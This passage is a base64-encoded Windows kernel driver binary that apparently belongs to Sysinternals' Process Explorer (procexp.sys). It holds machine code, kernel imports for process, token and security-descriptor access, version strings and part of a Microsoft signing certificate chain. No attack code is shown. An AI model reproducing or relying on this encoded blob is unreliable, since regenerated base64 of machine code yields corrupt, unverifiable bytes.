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AAAABKWAAAAAAAAKJYAAAAAAAA2lgAAAAAAAFSWAAAAAAAAcpYAAAAAAACQlgAAAAAAALCWAAAAAAAAzpYAAAAAAADolgAAAAAAAPSWAAAAAAAA/pYAAAAAAAAKlwAAAAAAABqXAAAAAAAANJcAAAAAAABUlwAAAAAAAHSXAAAAAAAAlJcAAAAAAAC0lwAAAAAAAMCXAAAAAAAAzpcAAAAAAADglwAAAAAAAAiYAAAAAAAAAAAAAAAAAAAYCHN0cm5jcHkAugVSdGxJbml0VW5pY29kZVN0cmluZwAASwZSdGxVbmljb2RlU3RyaW5nVG9BbnNpU3RyaW5nAACTBVJ0bEZyZWVBbnNpU3RyaW5nAIcDS2VXYWl0Rm9yU2luZ2xlT2JqZWN0AHMARXhBbGxvY2F0ZVBvb2xXaXRoVGFnAIsARXhGcmVlUG9vbFdpdGhUYWcAkABFeEdldFByZXZpb3VzTW9kZQC/A01tR2V0U3lzdGVtUm91dGluZUFkZHJlc3MAhAZTZUNhcHR1cmVTdWJqZWN0Q29udGV4dACqBlNlUmVsZWFzZVN1YmplY3RDb250ZXh0AKMCSW9mQ29tcGxldGVSZXF1ZXN0AADYAUlvQ3JlYXRlU3ltYm9saWNMaW5rAADjAUlvRGVsZXRlRGV2aWNlAADlAUlvRGVsZXRlU3ltYm9saWNMaW5rAAB8BE9iUmVmZXJlbmNlT2JqZWN0QnlIYW5kbGUAiARPYmZEZXJlZmVyZW5jZU9iamVjdAAAEgdad0Nsb3NlAMMDTW1Jc0FkZHJlc3NWYWxpZAAA8ARQc0dldFZlcnNpb24AAFIHWndPcGVuUHJvY2VzcwB3A0tlU3RhY2tBdHRhY2hQcm9jZXNzAACBA0tlVW5zdGFja0RldGFjaFByb2Nlc3MAAKAGU2VQcml2aWxlZ2VDaGVjawAA/ARQc0xvb2t1cFByb2Nlc3NCeVByb2Nlc3NJZAAAdwRPYk9wZW5PYmplY3RCeVBvaW50ZXIAegRPYlF1ZXJ5TmFtZVN0cmluZwB8B1p3UXVlcnlPYmplY3QALQdad0R1cGxpY2F0ZU9iamVjdABTB1p3T3BlblByb2Nlc3NUb2tlbgAAcwdad1F1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzAIIHWndRdWVyeVN5c3RlbUluZm9ybWF0aW9uAABlBE9iQ2xvc2VIYW5kbGUAdgRPYk9wZW5PYmplY3RCeU5hbWUAAL0HX19DX3NwZWNpZmljX2hhbmRsZXIAAPIBSW9GaWxlT2JqZWN0VHlwZQAA/wRQc1Byb2Nlc3NUeXBlAB8FUHNUaHJlYWRUeXBlAABudG9za3JubC5leGUAAM4BSW9DcmVhdGVEZXZpY2UAAKkHWndTZXRTZWN1cml0eU9iamVjdADpAUlvRGV2aWNlT2JqZWN0VHlwZQAA0Adfc253cHJpbnRmAADqBVJ0bExlbmd0aFNlY3VyaXR5RGVzY3JpcHRvcgCDBlNlQ2FwdHVyZVNlY3VyaXR5RGVzY3JpcHRvcgBXBVJ0bENyZWF0ZVNlY3VyaXR5RGVzY3JpcHRvcgArBlJ0bFNldERhY2xTZWN1cml0eURlc2NyaXB0b3IAACIFUnRsQWJzb2x1dGVUb1NlbGZSZWxhdGl2ZVNEACwCSW9Jc1dkbVZlcnNpb25BdmFpbGFibGUAkgZTZUV4cG9ydHMALQh3Y3NjaHIAAOoHX3djc25pY21wAOsFUnRsTGVuZ3RoU2lkAAAjBVJ0bEFkZEFjY2Vzc0FsbG93ZWRBY2UAAKsFUnRsR2V0U2FjbFNlY3VyaXR5RGVzY3JpcHRvcgAAnQVSdGxHZXREYWNsU2VjdXJpdHlEZXNjcmlwdG9yAACjBVJ0bEdldEdyb3VwU2VjdXJpdHlEZXNjcmlwdG9yAKkFUnRsR2V0T3duZXJTZWN1cml0eURlc2NyaXB0b3IATgdad09wZW5LZXkAHgdad0NyZWF0ZUtleQCDB1p3UXVlcnlWYWx1ZUtleQCuB1p3U2V0VmFsdWVLZXkAlwVSdGxGcmVlVW5pY29kZVN0cmluZwAAyAJLZUJ1Z0NoZWNrRXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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